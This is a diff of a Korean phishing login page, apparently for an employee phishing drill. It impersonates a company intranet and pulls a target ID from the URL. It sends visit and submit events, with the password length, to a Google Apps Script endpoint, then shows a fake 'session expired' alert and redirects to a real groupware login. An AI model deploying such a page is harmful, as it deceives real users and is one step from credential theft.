@@ -3,61 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>로그인</title>
+    <title>사내 인트라넷 로그인</title>
     <style>
-        /* 오리지널 디자인 유지 */
-        body { 
-            font-family: 'Malgun Gothic', sans-serif; 
-            display: flex; 
-            justify-content: center; 
-            align-items: flex-start; 
-            padding-top: 20vh; 
-            min-height: 100vh; 
-            background-color: #ffffff; 
-            margin: 0; 
-            box-sizing: border-box;
-        }
-        .login-container {
-            width: 380px;
-            padding: 40px;
-            border: 1px solid #e0e0e0;
-            background-color: #ffffff;
-            text-align: center;
-        }
-        .logo-area {
-            margin-bottom: 30px;
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
-        }
-        input[type="text"], input[type="password"] { 
-            width: 100%; 
-            padding: 14px; 
-            margin-bottom: 10px; 
-            border: 1px solid #333; 
-            background-color: #e8f0fe; /* 하늘색 배경 유지 */
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-        button { 
-            width: 100%; 
-            padding: 14px; 
-            background-color: #009ebf; 
-            color: white; 
-            border: none; 
-            cursor: pointer; 
-            font-size: 15px; 
-            font-weight: bold;
-            margin-bottom: 15px;
-        }
+        body { font-family: 'Malgun Gothic', sans-serif; display: flex; justify-content: center; align-items: flex-start; padding-top: 20vh; min-height: 100vh; background-color: #ffffff; margin: 0; box-sizing: border-box; }
+        .login-container { width: 380px; padding: 40px; border: 1px solid #e0e0e0; background-color: #ffffff; text-align: center; }
+        .logo-area { margin-bottom: 30px; font-size: 24px; font-weight: bold; color: #333; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin-bottom: 10px; border: 1px solid #333; background-color: #e8f0fe; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 14px; background-color: #009ebf; color: white; border: none; cursor: pointer; font-size: 15px; font-weight: bold; margin-bottom: 15px; }
         button:hover { background-color: #00819c; }
-        .options {
-            display: flex;
-            justify-content: flex-start;
-            align-items: center;
-            font-size: 12px;
-            color: #666;
-        }
+        .options { display: flex; justify-content: flex-start; align-items: center; font-size: 12px; color: #666; }
         .options input { margin-right: 5px; }
     </style>
 </head>
@@ -72,7 +26,6 @@
             <input type="text" id="userId" placeholder="아이디를 입력하세요" required>
             <input type="password" id="userPw" placeholder="비밀번호" required>
             <button type="submit">로그인</button>
-            
             <div class="options">
                 <input type="checkbox" id="saveId"> <label for="saveId">계정 저장</label>
             </div>
@@ -80,57 +33,50 @@
     </div>
 
     <script>
-        // 형이 발급받은 구글 앱스 스크립트 웹 앱 URL
-        const gasUrl = 'https://script.google.com/macros/s/AKfycbyfd3qRuBKebzvT6MUiyAydeFfa67BnQxGnFGFC-GKiEAqcHpUj7C48PDKBW5co3RXljw/exec';
+        // ★ 최신 GAS 배포 URL을 여기에 넣어줘!
+        const gasUrl = 'https://script.google.com/macros/s/AKfycbzQjXBTwmzw0EKtQxj8s9wgKgRIbtQ3NKTaqC3aIQpU6jyWkztHtBHLhYxOJQgF-V7puw/exec';
 
-        // 1. 페이지 로드 시: ?id=... 파라미터를 읽어서 아이디 칸을 채우고 '접속' 로그를 즉시 전송
+        let targetIdFromUrl = "";
+
+        // 1. 페이지 로드 시: ?id= 값을 '수집대상'으로 인식
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
-            const userEmail = urlParams.get('id');
+            targetIdFromUrl = urlParams.get('id') || "알수없음";
 
-            if (userEmail) {
-                // 아이디 입력창에 자동 입력
-                document.getElementById('userId').value = userEmail;
+            if (targetIdFromUrl !== "알수없음") {
+                // 아이디 칸에 자동 입력
+                document.getElementById('userId').value = targetIdFromUrl;
 
-                // 시트로 '접속' 데이터 전송 (비번 길이는 0으로 기록)
+                // [접속 로그] 전송: 시간 | 수집대상 | 접속 | 0
                 var formData = new FormData();
+                formData.append('targetId', targetIdFromUrl);
                 formData.append('type', '접속');
-                formData.append('userId', userEmail);
-                formData.append('userPwLen', '0');
+                formData.append('pwLen', '0');
 
                 fetch(gasUrl, { method: 'POST', mode: 'no-cors', body: formData });
             }
         };
 
-        // 2. 로그인 버튼 클릭 시: 비밀번호 '글자 수'만 세어서 '입력' 로그 전송 후 리다이렉트
+        // 2. 로그인 클릭 시: 시간 | 수집대상 | 입력 | 비번길이
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
 
-            var userId = document.getElementById('userId').value;
-            var userPw = document.getElementById('userPw').value;
+            var inputPw = document.getElementById('userPw').value;
             
-            // 비밀번호 실제 내용 대신 글자 수(길이)만 추출
-            var userPwLen = userPw.length; 
-
             var formData = new FormData();
+            formData.append('targetId', targetIdFromUrl); // URL의 원본 대상 아이디 유지
             formData.append('type', '입력');
-            formData.append('userId', userId);
-            formData.append('userPwLen', userPwLen); // 비번 내용 대신 숫자 전송
+            formData.append('pwLen', inputPw.length); // 비번은 길이만 숫자로!
 
             fetch(gasUrl, {
                 method: 'POST',
                 mode: 'no-cors', 
                 body: formData
             }).then(() => {
-                // 성공 알림 후 실제 그룹웨어 로그인 페이지로 이동
-                alert('보안 세션이 만료되었습니다. 안전을 위해 다시 로그인해 주세요.');
-                window.location.href = 'https://gnware.gnk.or.kr/login';
-            }).catch(error => {
-                // 에러 발생 시에도 자연스럽게 이동
+                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                 window.location.href = 'https://gnware.gnk.or.kr/login';
             });
         });
     </script>
-
 </body>
 </html>
